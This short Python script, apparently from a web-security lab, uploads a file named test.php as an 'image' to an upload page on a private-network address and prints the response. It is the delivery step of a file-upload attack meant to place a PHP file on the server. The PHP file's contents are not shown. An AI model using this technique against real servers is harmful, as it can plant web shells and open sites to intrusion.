import requests
files = {'image': open('test.php', 'rb')}
r = requests.post("http://10.0.1.14/upload/example1.php", files=files)
print(r.text)